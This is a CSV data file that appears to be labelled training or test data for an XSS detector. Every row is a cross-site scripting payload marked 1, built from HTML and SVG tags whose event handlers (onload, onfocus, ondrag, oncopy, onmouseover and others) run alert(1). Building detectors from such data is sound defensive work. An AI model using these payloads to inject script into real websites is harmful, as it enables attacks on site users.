input,label
<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>,1
<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>,1
<svg><applet onload=alert(1)></applet>,1
<svg><area onload=alert(1)></area>,1
<svg><article onload=alert(1)></article>,1
<svg><aside onload=alert(1)></aside>,1
<svg><audio onload=alert(1)></audio>,1
<svg><b onload=alert(1)></b>,1
<svg><base onload=alert(1)></base>,1
<svg><basefont onload=alert(1)></basefont>,1
<svg><bdi onload=alert(1)></bdi>,1
<svg><bdo onload=alert(1)></bdo>,1
<svg><bgsound onload=alert(1)></bgsound>,1
<svg><big onload=alert(1)></big>,1
<svg><blink onload=alert(1)></blink>,1
<svg><blockquote onload=alert(1)></blockquote>,1
<svg><br onload=alert(1)></br>,1
<svg><button onload=alert(1)></button>,1
<svg><canvas onload=alert(1)></canvas>,1
<svg><caption onload=alert(1)></caption>,1
<svg><center onload=alert(1)></center>,1
<svg><cite onload=alert(1)></cite>,1
<svg><code onload=alert(1)></code>,1
<svg><col onload=alert(1)></col>,1
<svg><colgroup onload=alert(1)></colgroup>,1
<svg><command onload=alert(1)></command>,1
<svg><content onload=alert(1)></content>,1
<svg><data onload=alert(1)></data>,1
<svg><datalist onload=alert(1)></datalist>,1
<svg><dd onload=alert(1)></dd>,1
<svg><del onload=alert(1)></del>,1
<svg><details onload=alert(1)></details>,1
<svg><dfn onload=alert(1)></dfn>,1
<svg><dialog onload=alert(1)></dialog>,1
<svg><dir onload=alert(1)></dir>,1
<svg><discard onbegin=alert(1)>,1
<svg><div onload=alert(1)></div>,1
<svg><dl onload=alert(1)></dl>,1
<svg><dt onload=alert(1)></dt>,1
<svg><element onload=alert(1)></element>,1
<svg><em onload=alert(1)></em>,1
<svg><fieldset onload=alert(1)></fieldset>,1
<svg><figcaption onload=alert(1)></figcaption>,1
<svg><figure onload=alert(1)></figure>,1
<svg><font onload=alert(1)></font>,1
<svg><footer onload=alert(1)></footer>,1
<svg><form onload=alert(1)></form>,1
<svg><frameset onload=alert(1)></frameset>,1
<svg><h1 onload=alert(1)></h1>,1
<svg><head onload=alert(1)></head>,1
<svg><header onload=alert(1)></header>,1
<svg><hgroup onload=alert(1)></hgroup>,1
<svg><hr onload=alert(1)></hr>,1
<svg><html onload=alert(1)></html>,1
<svg><i onload=alert(1)></i>,1
<svg><image href=1 onerror=alert(1)>,1
<svg><image href=validimage.png onload=alert(1)>,1
<svg><ins onload=alert(1)></ins>,1
<svg><kbd onload=alert(1)></kbd>,1
<svg><keygen onload=alert(1)></keygen>,1
<svg><label onload=alert(1)></label>,1
<svg><legend onload=alert(1)></legend>,1
<svg><li onload=alert(1)></li>,1
<svg><listing onload=alert(1)></listing>,1
<svg><main onload=alert(1)></main>,1
<svg><map onload=alert(1)></map>,1
<svg><mark onload=alert(1)></mark>,1
<svg><marquee onload=alert(1)></marquee>,1
<svg><menu onload=alert(1)></menu>,1
<svg><menuitem onload=alert(1)></menuitem>,1
<svg><meta onload=alert(1)></meta>,1
<svg><meter onload=alert(1)></meter>,1
<svg><multicol onload=alert(1)></multicol>,1
<svg><nav onload=alert(1)></nav>,1
<svg><nextid onload=alert(1)></nextid>,1
<svg><nobr onload=alert(1)></nobr>,1
<svg><noembed onload=alert(1)></noembed>,1
<svg><noframes onload=alert(1)></noframes>,1
<svg><noscript onload=alert(1)></noscript>,1
<svg><ol onload=alert(1)></ol>,1
<svg><optgroup onload=alert(1)></optgroup>,1
<svg><option onload=alert(1)></option>,1
<svg><output onload=alert(1)></output>,1
<svg><p onload=alert(1)></p>,1
<svg><param onload=alert(1)></param>,1
"<svg><path><animateMotion onbegin=alert(1) dur=""1s"" repeatCount=""1"">",1
<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>,1
"<svg><path><animateMotion onrepeat=alert(1) dur=""1s"" repeatCount=""2"">",1
<svg><picture onload=alert(1)></picture>,1
<svg><plaintext onload=alert(1)></plaintext>,1
<svg><pre onload=alert(1)></pre>,1
<svg><progress onload=alert(1)></progress>,1
<svg><q onload=alert(1)></q>,1
<svg><rb onload=alert(1)></rb>,1
<svg><rp onload=alert(1)></rp>,1
<svg><rt onload=alert(1)></rt>,1
<svg><rtc onload=alert(1)></rtc>,1
<svg><ruby onload=alert(1)></ruby>,1
<svg><s onload=alert(1)></s>,1
<svg><samp onload=alert(1)></samp>,1
<svg><section onload=alert(1)></section>,1
<svg><select onload=alert(1)></select>,1
<svg><set onbegin=alert(1) attributename=x dur=1s>,1
<svg><set onend=alert(1) attributename=x dur=1s>,1
<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>,1
<svg><shadow onload=alert(1)></shadow>,1
<svg><slot onload=alert(1)></slot>,1
<svg><small onload=alert(1)></small>,1
<svg><source onload=alert(1)></source>,1
<svg><spacer onload=alert(1)></spacer>,1
<svg><span onload=alert(1)></span>,1
<svg><strike onload=alert(1)></strike>,1
<svg><strong onload=alert(1)></strong>,1
<svg><sub onload=alert(1)></sub>,1
<svg><summary onload=alert(1)></summary>,1
<svg><sup onload=alert(1)></sup>,1
<svg><table onload=alert(1)></table>,1
<svg><tbody onload=alert(1)></tbody>,1
<svg><td onload=alert(1)></td>,1
<svg><template onload=alert(1)></template>,1
<svg><textarea onload=alert(1)></textarea>,1
<svg><tfoot onload=alert(1)></tfoot>,1
<svg><th onload=alert(1)></th>,1
<svg><thead onload=alert(1)></thead>,1
<svg><time onload=alert(1)></time>,1
<svg><title onload=alert(1)></title>,1
<svg><tr onload=alert(1)></tr>,1
<svg><tt onload=alert(1)></tt>,1
<svg><u onload=alert(1)></u>,1
<svg><ul onload=alert(1)></ul>,1
<svg><var onload=alert(1)></var>,1
<svg><video onload=alert(1)></video>,1
<svg><wbr onload=alert(1)></wbr>,1
<svg><xmp onload=alert(1)></xmp>,1
<svg><xss onload=alert(1)></xss>,1
"<table draggable=""true"" ondrag=""alert(1)"">test</table>",1
"<table draggable=""true"" ondragend=""alert(1)"">test</table>",1
"<table draggable=""true"" ondragenter=""alert(1)"">test</table>",1
"<table draggable=""true"" ondragleave=""alert(1)"">test</table>",1
"<table draggable=""true"" ondragstart=""alert(1)"">test</table>",1
<table id=x tabindex=1 onactivate=alert(1)></table>,1
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,1
<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,1
<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>,1
<table id=x tabindex=1 onfocus=alert(1)></table>,1
<table id=x tabindex=1 onfocusin=alert(1)></table>,1
"<table onbeforecopy=""alert(1)"" contenteditable>test</table>",1
"<table onbeforecut=""alert(1)"" contenteditable>test</table>",1
"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",1
<table onblur=alert(1) tabindex=1 id=x></table><input autofocus>,1
"<table onclick=""alert(1)"">test</table>",1
"<table oncontextmenu=""alert(1)"">test</table>",1
"<table oncopy=""alert(1)"" contenteditable>test</table>",1
"<table oncut=""alert(1)"" contenteditable>test</table>",1
"<table ondblclick=""alert(1)"">test</table>",1
<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>,1
"<table onkeydown=""alert(1)"" contenteditable>test</table>",1
"<table onkeypress=""alert(1)"" contenteditable>test</table>",1
"<table onkeyup=""alert(1)"" contenteditable>test</table>",1
"<table onmousedown=""alert(1)"">test</table>",1
"<table onmouseenter=""alert(1)"">test</table>",1
"<table onmouseleave=""alert(1)"">test</table>",1
"<table onmousemove=""alert(1)"">test</table>",1
"<table onmouseout=""alert(1)"">test</table>",1
"<table onmouseover=""alert(1)"">test</table>",1
"<table onmouseup=""alert(1)"">test</table>",1
"<table onpaste=""alert(1)"" contenteditable>test</table>",1
"<tbody draggable=""true"" ondrag=""alert(1)"">test</tbody>",1
"<tbody draggable=""true"" ondragend=""alert(1)"">test</tbody>",1
"<tbody draggable=""true"" ondragenter=""alert(1)"">test</tbody>",1
"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",1
"<tbody draggable=""true"" ondragstart=""alert(1)"">test</tbody>",1
<tbody id=x tabindex=1 onactivate=alert(1)></tbody>,1
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,1
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,1
<tbody id=x tabindex=1 ondeactivate=alert(1)></tbody><input id=y autofocus>,1
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,1
<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>,1
"<tbody onbeforecopy=""alert(1)"" contenteditable>test</tbody>",1
"<tbody onbeforecut=""alert(1)"" contenteditable>test</tbody>",1
"<tbody onbeforepaste=""alert(1)"" contenteditable>test</tbody>",1
<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>,1
"<tbody onclick=""alert(1)"">test</tbody>",1
"<tbody oncontextmenu=""alert(1)"">test</tbody>",1
"<tbody oncopy=""alert(1)"" contenteditable>test</tbody>",1
"<tbody oncut=""alert(1)"" contenteditable>test</tbody>",1
"<tbody ondblclick=""alert(1)"">test</tbody>",1
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,1
"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",1
"<tbody onkeypress=""alert(1)"" contenteditable>test</tbody>",1
"<tbody onkeyup=""alert(1)"" contenteditable>test</tbody>",1
"<tbody onmousedown=""alert(1)"">test</tbody>",1
"<tbody onmouseenter=""alert(1)"">test</tbody>",1
"<tbody onmouseleave=""alert(1)"">test</tbody>",1
"<tbody onmousemove=""alert(1)"">test</tbody>",1
"<tbody onmouseout=""alert(1)"">test</tbody>",1
"<tbody onmouseover=""alert(1)"">test</tbody>",1
"<tbody onmouseup=""alert(1)"">test</tbody>",1
"<tbody onpaste=""alert(1)"" contenteditable>test</tbody>",1
"<td draggable=""true"" ondrag=""alert(1)"">test</td>",1
"<td draggable=""true"" ondragend=""alert(1)"">test</td>",1
"<td draggable=""true"" ondragenter=""alert(1)"">test</td>",1
"<td draggable=""true"" ondragleave=""alert(1)"">test</td>",1
"<td draggable=""true"" ondragstart=""alert(1)"">test</td>",1
<td id=x tabindex=1 onactivate=alert(1)></td>,1
<td id=x tabindex=1 onbeforeactivate=alert(1)></td>,1
<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>,1
<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>,1
<td id=x tabindex=1 onfocus=alert(1)></td>,1
<td id=x tabindex=1 onfocusin=alert(1)></td>,1
"<td onbeforecopy=""alert(1)"" contenteditable>test</td>",1
"<td onbeforecut=""alert(1)"" contenteditable>test</td>",1
"<td onbeforepaste=""alert(1)"" contenteditable>test</td>",1
<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>,1
"<td onclick=""alert(1)"">test</td>",1
"<td oncontextmenu=""alert(1)"">test</td>",1
"<td oncopy=""alert(1)"" contenteditable>test</td>",1
"<td oncut=""alert(1)"" contenteditable>test</td>",1
"<td ondblclick=""alert(1)"">test</td>",1
<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>,1
"<td onkeydown=""alert(1)"" contenteditable>test</td>",1
"<td onkeypress=""alert(1)"" contenteditable>test</td>",1
"<td onkeyup=""alert(1)"" contenteditable>test</td>",1
"<td onmousedown=""alert(1)"">test</td>",1
"<td onmouseenter=""alert(1)"">test</td>",1
"<td onmouseleave=""alert(1)"">test</td>",1
"<td onmousemove=""alert(1)"">test</td>",1
"<td onmouseout=""alert(1)"">test</td>",1
"<td onmouseover=""alert(1)"">test</td>",1
"<td onmouseup=""alert(1)"">test</td>",1
"<td onpaste=""alert(1)"" contenteditable>test</td>",1
"<template draggable=""true"" ondrag=""alert(1)"">test</template>",1
"<template draggable=""true"" ondragend=""alert(1)"">test</template>",1
"<template draggable=""true"" ondragenter=""alert(1)"">test</template>",1
"<template draggable=""true"" ondragleave=""alert(1)"">test</template>",1
"<template draggable=""true"" ondragstart=""alert(1)"">test</template>",1
<template id=x tabindex=1 onactivate=alert(1)></template>,1
<template id=x tabindex=1 onbeforeactivate=alert(1)></template>,1
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,1
<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>,1
<template id=x tabindex=1 onfocus=alert(1)></template>,1
<template id=x tabindex=1 onfocusin=alert(1)></template>,1
"<template onbeforecopy=""alert(1)"" contenteditable>test</template>",1
"<template onbeforecut=""alert(1)"" contenteditable>test</template>",1
"<template onbeforepaste=""alert(1)"" contenteditable>test</template>",1
<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>,1
"<template onclick=""alert(1)"">test</template>",1
"<template oncontextmenu=""alert(1)"">test</template>",1
"<template oncopy=""alert(1)"" contenteditable>test</template>",1
"<template oncut=""alert(1)"" contenteditable>test</template>",1
"<template ondblclick=""alert(1)"">test</template>",1
<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>,1
"<template onkeydown=""alert(1)"" contenteditable>test</template>",1
"<template onkeypress=""alert(1)"" contenteditable>test</template>",1
"<template onkeyup=""alert(1)"" contenteditable>test</template>",1
"<template onmousedown=""alert(1)"">test</template>",1
"<template onmouseenter=""alert(1)"">test</template>",1
"<template onmouseleave=""alert(1)"">test</template>",1
"<template onmousemove=""alert(1)"">test</template>",1
"<template onmouseout=""alert(1)"">test</template>",1
"<template onmouseover=""alert(1)"">test</template>",1
"<template onmouseup=""alert(1)"">test</template>",1
"<template onpaste=""alert(1)"" contenteditable>test</template>",1
<textarea autofocus onfocus=alert(1)>test</textarea>,1
<textarea autofocus onfocusin=alert(1)>test</textarea>,1
"<textarea draggable=""true"" ondrag=""alert(1)"">test</textarea>",1
"<textarea draggable=""true"" ondragend=""alert(1)"">test</textarea>",1
"<textarea draggable=""true"" ondragenter=""alert(1)"">test</textarea>",1
"<textarea draggable=""true"" ondragleave=""alert(1)"">test</textarea>",1
"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",1
<textarea id=x tabindex=1 onactivate=alert(1)></textarea>,1
<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>,1
<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>,1
<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>,1
<textarea onauxclick=alert(1)>XSS</textarea>,1
<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>,1
<textarea onbeforecut=alert(1) autofocus>XSS</textarea>,1
<textarea onbeforepaste=alert(1) autofocus></textarea>,1
<textarea onblur=alert(1) id=x></textarea><input autofocus>,1
<textarea onchange=alert(1)>XSS</textarea>,1
"<textarea onclick=""alert(1)"">test</textarea>",1
"<textarea oncontextmenu=""alert(1)"">test</textarea>",1
<textarea oncopy=alert(1) autofocus>XSS</textarea>,1
<textarea oncut=alert(1) autofocus>XSS</textarea>,1
"<textarea ondblclick=""alert(1)"">test</textarea>",1
<textarea onfocusout=alert(1) id=x></textarea><input autofocus>,1
<textarea oninput=alert(1)>XSS</textarea>,1
"<textarea onkeydown=""alert(1)"" contenteditable>test</textarea>",1
"<textarea onkeypress=""alert(1)"" contenteditable>test</textarea>",1
"<textarea onkeyup=""alert(1)"" contenteditable>test</textarea>",1
"<textarea onmousedown=""alert(1)"">test</textarea>",1
"<textarea onmouseenter=""alert(1)"">test</textarea>",1
"<textarea onmouseleave=""alert(1)"">test</textarea>",1
"<textarea onmousemove=""alert(1)"">test</textarea>",1
"<textarea onmouseout=""alert(1)"">test</textarea>",1
"<textarea onmouseover=""alert(1)"">test</textarea>",1
"<textarea onmouseup=""alert(1)"">test</textarea>",1
<textarea onpaste=alert(1) autofocus></textarea>,1
<textarea onselect=alert(1) autofocus>XSS</textarea>,1
"<tfoot draggable=""true"" ondrag=""alert(1)"">test</tfoot>",1
"<tfoot draggable=""true"" ondragend=""alert(1)"">test</tfoot>",1
"<tfoot draggable=""true"" ondragenter=""alert(1)"">test</tfoot>",1
"<tfoot draggable=""true"" ondragleave=""alert(1)"">test</tfoot>",1
"<tfoot draggable=""true"" ondragstart=""alert(1)"">test</tfoot>",1
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,1
<tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>,1
<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>,1
<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>,1
<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>,1
<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>,1
"<tfoot onbeforecopy=""alert(1)"" contenteditable>test</tfoot>",1
"<tfoot onbeforecut=""alert(1)"" contenteditable>test</tfoot>",1
"<tfoot onbeforepaste=""alert(1)"" contenteditable>test</tfoot>",1
<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>,1
"<tfoot onclick=""alert(1)"">test</tfoot>",1
"<tfoot oncontextmenu=""alert(1)"">test</tfoot>",1
"<tfoot oncopy=""alert(1)"" contenteditable>test</tfoot>",1
"<tfoot oncut=""alert(1)"" contenteditable>test</tfoot>",1
"<tfoot ondblclick=""alert(1)"">test</tfoot>",1
<tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>,1
"<tfoot onkeydown=""alert(1)"" contenteditable>test</tfoot>",1
"<tfoot onkeypress=""alert(1)"" contenteditable>test</tfoot>",1
"<tfoot onkeyup=""alert(1)"" contenteditable>test</tfoot>",1
"<tfoot onmousedown=""alert(1)"">test</tfoot>",1
"<tfoot onmouseenter=""alert(1)"">test</tfoot>",1
"<tfoot onmouseleave=""alert(1)"">test</tfoot>",1
"<tfoot onmousemove=""alert(1)"">test</tfoot>",1
"<tfoot onmouseout=""alert(1)"">test</tfoot>",1
"<tfoot onmouseover=""alert(1)"">test</tfoot>",1
"<tfoot onmouseup=""alert(1)"">test</tfoot>",1
"<tfoot onpaste=""alert(1)"" contenteditable>test</tfoot>",1
"<th draggable=""true"" ondrag=""alert(1)"">test</th>",1
"<th draggable=""true"" ondragend=""alert(1)"">test</th>",1
"<th draggable=""true"" ondragenter=""alert(1)"">test</th>",1
"<th draggable=""true"" ondragleave=""alert(1)"">test</th>",1
"<th draggable=""true"" ondragstart=""alert(1)"">test</th>",1
<th id=x tabindex=1 onactivate=alert(1)></th>,1
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,1
<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>,1
<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>,1
<th id=x tabindex=1 onfocus=alert(1)></th>,1
<th id=x tabindex=1 onfocusin=alert(1)></th>,1
"<th onbeforecopy=""alert(1)"" contenteditable>test</th>",1
"<th onbeforecut=""alert(1)"" contenteditable>test</th>",1
"<th onbeforepaste=""alert(1)"" contenteditable>test</th>",1
<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>,1
"<th onclick=""alert(1)"">test</th>",1
"<th oncontextmenu=""alert(1)"">test</th>",1
"<th oncopy=""alert(1)"" contenteditable>test</th>",1
"<th oncut=""alert(1)"" contenteditable>test</th>",1
"<th ondblclick=""alert(1)"">test</th>",1
<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>,1
"<th onkeydown=""alert(1)"" contenteditable>test</th>",1
"<th onkeypress=""alert(1)"" contenteditable>test</th>",1
"<th onkeyup=""alert(1)"" contenteditable>test</th>",1
"<th onmousedown=""alert(1)"">test</th>",1
"<th onmouseenter=""alert(1)"">test</th>",1
"<th onmouseleave=""alert(1)"">test</th>",1
"<th onmousemove=""alert(1)"">test</th>",1
"<th onmouseout=""alert(1)"">test</th>",1
"<th onmouseover=""alert(1)"">test</th>",1
"<th onmouseup=""alert(1)"">test</th>",1
"<th onpaste=""alert(1)"" contenteditable>test</th>",1
"<thead draggable=""true"" ondrag=""alert(1)"">test</thead>",1
"<thead draggable=""true"" ondragend=""alert(1)"">test</thead>",1
"<thead draggable=""true"" ondragenter=""alert(1)"">test</thead>",1
"<thead draggable=""true"" ondragleave=""alert(1)"">test</thead>",1
"<thead draggable=""true"" ondragstart=""alert(1)"">test</thead>",1
<thead id=x tabindex=1 onactivate=alert(1)></thead>,1
<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>,1
<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>,1
<thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>,1
<thead id=x tabindex=1 onfocus=alert(1)></thead>,1
<thead id=x tabindex=1 onfocusin=alert(1)></thead>,1
"<thead onbeforecopy=""alert(1)"" contenteditable>test</thead>",1
"<thead onbeforecut=""alert(1)"" contenteditable>test</thead>",1
"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",1
<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>,1
"<thead onclick=""alert(1)"">test</thead>",1
"<thead oncontextmenu=""alert(1)"">test</thead>",1
"<thead oncopy=""alert(1)"" contenteditable>test</thead>",1
"<thead oncut=""alert(1)"" contenteditable>test</thead>",1
"<thead ondblclick=""alert(1)"">test</thead>",1
<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>,1
"<thead onkeydown=""alert(1)"" contenteditable>test</thead>",1
"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",1
"<thead onkeyup=""alert(1)"" contenteditable>test</thead>",1
"<thead onmousedown=""alert(1)"">test</thead>",1
"<thead onmouseenter=""alert(1)"">test</thead>",1
"<thead onmouseleave=""alert(1)"">test</thead>",1
"<thead onmousemove=""alert(1)"">test</thead>",1
"<thead onmouseout=""alert(1)"">test</thead>",1
"<thead onmouseover=""alert(1)"">test</thead>",1
"<thead onmouseup=""alert(1)"">test</thead>",1
"<thead onpaste=""alert(1)"" contenteditable>test</thead>",1
"<time draggable=""true"" ondrag=""alert(1)"">test</time>",1
"<time draggable=""true"" ondragend=""alert(1)"">test</time>",1
"<time draggable=""true"" ondragenter=""alert(1)"">test</time>",1
"<time draggable=""true"" ondragleave=""alert(1)"">test</time>",1
"<time draggable=""true"" ondragstart=""alert(1)"">test</time>",1
<time id=x tabindex=1 onactivate=alert(1)></time>,1
<time id=x tabindex=1 onbeforeactivate=alert(1)></time>,1
<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>,1
<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>,1
<time id=x tabindex=1 onfocus=alert(1)></time>,1
<time id=x tabindex=1 onfocusin=alert(1)></time>,1
"<time onbeforecopy=""alert(1)"" contenteditable>test</time>",1
"<time onbeforecut=""alert(1)"" contenteditable>test</time>",1
"<time onbeforepaste=""alert(1)"" contenteditable>test</time>",1
<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>,1
"<time onclick=""alert(1)"">test</time>",1
"<time oncontextmenu=""alert(1)"">test</time>",1
"<time oncopy=""alert(1)"" contenteditable>test</time>",1
"<time oncut=""alert(1)"" contenteditable>test</time>",1
"<time ondblclick=""alert(1)"">test</time>",1
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,1
"<time onkeydown=""alert(1)"" contenteditable>test</time>",1
"<time onkeypress=""alert(1)"" contenteditable>test</time>",1
"<time onkeyup=""alert(1)"" contenteditable>test</time>",1
"<time onmousedown=""alert(1)"">test</time>",1
"<time onmouseenter=""alert(1)"">test</time>",1
"<time onmouseleave=""alert(1)"">test</time>",1
"<time onmousemove=""alert(1)"">test</time>",1
"<time onmouseout=""alert(1)"">test</time>",1
"<time onmouseover=""alert(1)"">test</time>",1
"<time onmouseup=""alert(1)"">test</time>",1
"<time onpaste=""alert(1)"" contenteditable>test</time>",1
"<title draggable=""true"" ondrag=""alert(1)"">test</title>",1
"<title draggable=""true"" ondragend=""alert(1)"">test</title>",1
"<title draggable=""true"" ondragenter=""alert(1)"">test</title>",1
"<title draggable=""true"" ondragleave=""alert(1)"">test</title>",1
"<title draggable=""true"" ondragstart=""alert(1)"">test</title>",1
<title id=x tabindex=1 onactivate=alert(1)></title>,1
<title id=x tabindex=1 onbeforeactivate=alert(1)></title>,1
<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>,1
<title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>,1
<title id=x tabindex=1 onfocus=alert(1)></title>,1
<title id=x tabindex=1 onfocusin=alert(1)></title>,1
"<title onbeforecopy=""alert(1)"" contenteditable>test</title>",1
"<title onbeforecut=""alert(1)"" contenteditable>test</title>",1
"<title onbeforepaste=""alert(1)"" contenteditable>test</title>",1
<title onblur=alert(1) tabindex=1 id=x></title><input autofocus>,1
"<title onclick=""alert(1)"">test</title>",1
"<title oncontextmenu=""alert(1)"">test</title>",1
"<title oncopy=""alert(1)"" contenteditable>test</title>",1
"<title oncut=""alert(1)"" contenteditable>test</title>",1
"<title ondblclick=""alert(1)"">test</title>",1
<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>,1
"<title onkeydown=""alert(1)"" contenteditable>test</title>",1
"<title onkeypress=""alert(1)"" contenteditable>test</title>",1
"<title onkeyup=""alert(1)"" contenteditable>test</title>",1
"<title onmousedown=""alert(1)"">test</title>",1
"<title onmouseenter=""alert(1)"">test</title>",1
"<title onmouseleave=""alert(1)"">test</title>",1
"<title onmousemove=""alert(1)"">test</title>",1
"<title onmouseout=""alert(1)"">test</title>",1
"<title onmouseover=""alert(1)"">test</title>",1
"<title onmouseup=""alert(1)"">test</title>",1
"<title onpaste=""alert(1)"" contenteditable>test</title>",1
"<tr draggable=""true"" ondrag=""alert(1)"">test</tr>",1
"<tr draggable=""true"" ondragend=""alert(1)"">test</tr>",1
"<tr draggable=""true"" ondragenter=""alert(1)"">test</tr>",1
"<tr draggable=""true"" ondragleave=""alert(1)"">test</tr>",1
"<tr draggable=""true"" ondragstart=""alert(1)"">test</tr>",1
<tr id=x tabindex=1 onactivate=alert(1)></tr>,1
<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>,1
<tr id=x tabindex=1 onbeforedeactivate=alert(1)></tr><input autofocus>,1
<tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>,1
<tr id=x tabindex=1 onfocus=alert(1)></tr>,1
<tr id=x tabindex=1 onfocusin=alert(1)></tr>,1
"<tr onbeforecopy=""alert(1)"" contenteditable>test</tr>",1
"<tr onbeforecut=""alert(1)"" contenteditable>test</tr>",1
"<tr onbeforepaste=""alert(1)"" contenteditable>test</tr>",1
<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>,1
"<tr onclick=""alert(1)"">test</tr>",1
"<tr oncontextmenu=""alert(1)"">test</tr>",1
"<tr oncopy=""alert(1)"" contenteditable>test</tr>",1
"<tr oncut=""alert(1)"" contenteditable>test</tr>",1
"<tr ondblclick=""alert(1)"">test</tr>",1
<tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>,1
"<tr onkeydown=""alert(1)"" contenteditable>test</tr>",1
"<tr onkeypress=""alert(1)"" contenteditable>test</tr>",1
"<tr onkeyup=""alert(1)"" contenteditable>test</tr>",1
"<tr onmousedown=""alert(1)"">test</tr>",1
"<tr onmouseenter=""alert(1)"">test</tr>",1
"<tr onmouseleave=""alert(1)"">test</tr>",1
"<tr onmousemove=""alert(1)"">test</tr>",1
"<tr onmouseout=""alert(1)"">test</tr>",1
"<tr onmouseover=""alert(1)"">test</tr>",1
"<tr onmouseup=""alert(1)"">test</tr>",1
"<tr onpaste=""alert(1)"" contenteditable>test</tr>",1
"<track draggable=""true"" ondrag=""alert(1)"">test</track>",1
"<track draggable=""true"" ondragend=""alert(1)"">test</track>",1
"<track draggable=""true"" ondragenter=""alert(1)"">test</track>",1
"<track draggable=""true"" ondragleave=""alert(1)"">test</track>",1
